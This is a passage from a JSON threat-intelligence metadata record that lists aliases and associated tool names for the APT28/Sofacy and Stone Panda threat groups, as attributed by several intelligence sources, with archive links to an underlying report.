                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "04b07437-41bb-4126-bcbb-def16f19d7c6",
            "created_at": "2022-10-25T16:07:24.232628Z",
            "updated_at": "2025-03-27T02:02:10.146043Z",
            "deleted_at": null,
            "main_name": "Stone Panda",
            "aliases": [
                "APT 10",
                "ATK 41",
                "Bronze Riverside",
                "CTG-5938",
                "CVNX",
                "Cuckoo Spear",
                "Earth Kasha",
                "Granite Taurus",
                "Happyyongzi",
                "Hogfish",
                "ITG01",
                "Operation A41APT",
                "Operation Cache Panda",
                "Operation ChessMaster",
                "Operation Cloud Hopper",
                "Operation Cuckoo Spear",
                "Operation New Battle",
                "Operation Soft Cell",
                "Operation TradeSecret",
                "Potassium",
                "Red Apollo",
                "Stone Panda",
                "TA429",
                "menuPass",
                "menuPass Team"
            ],
            "source_name": "ETDA:Stone Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "Anel",
                "AngryRebel",
                "BKDR_EVILOGE",
                "BKDR_HGDER",
                "BKDR_NVICM",
                "BUGJUICE",
                "CHINACHOPPER",
                "ChChes",
                "China Chopper",
                "Chymine",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "DARKTOWN",
                "DESLoader",
                "DILLJUICE",
                "DILLWEED",
                "Darkmoon",
                "DelfsCake",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "Ecipekac",
                "Emdivi",
                "EvilGrab",
                "EvilGrab RAT",
                "FYAnti",
                "Farfli",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "GreetCake",
                "HAYMAKER",
                "HEAVYHAND",
                "HEAVYPOT",
                "HTran",
                "HUC Packet Transmit Tool",
                "Ham Backdoor",
                "HiddenFace",
                "Impacket",
                "Invoke the Hash",
                "KABOB",
                "Kaba",
                "Korplug",
                "LODEINFO",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MiS-Type",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "NBTscan",
                "NOOPDOOR",
                "Newsripper",
                "P8RAT",
                "PCRat",
                "PlugX",
                "Poison Ivy",
                "Poldat",
                "PowerSploit",
                "PowerView",
                "PsExec",
                "PsList",
                "Quarks PwDump",
                "Quasar RAT",
                "QuasarRAT",
                "RedDelta",
                "RedLeaves",
                "Rubeus",
                "SNUGRIDE",
                "SPIVY",
                "SharpSploit",
                "SigLoader",
                "SinoChopper",
                "SodaMaster",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Trochilus RAT",
                "UpperCut",
                "Vidgrab",
                "WinRAR",
                "WmiExec",
                "Wmonder",
                "Xamtrav",
                "Yggdrasil",
                "Zlib",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "dfls",
                "lena",
                "nbtscan",
                "pivy",
                "poisonivy",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536253,
    "ts_updated_at": 1743041834,
    "ts_creation_date": 1653703710,
    "ts_modification_date": 1653703710,
    "files": {
        "pdf": "https://archive.orkl.eu/5d5db07b1a3c13b8dc7e3b0499cd29ed0b58d148.pdf",
        "text": "https://archive.orkl.eu/5d5db07b1a3c13b8dc7e3b0499cd29ed0b58d148.txt",
        "img": "https://archive.orkl.eu/5d5db07b1a3c13b8dc7e3b0499cd29ed0b58d148.jpg"
    }
}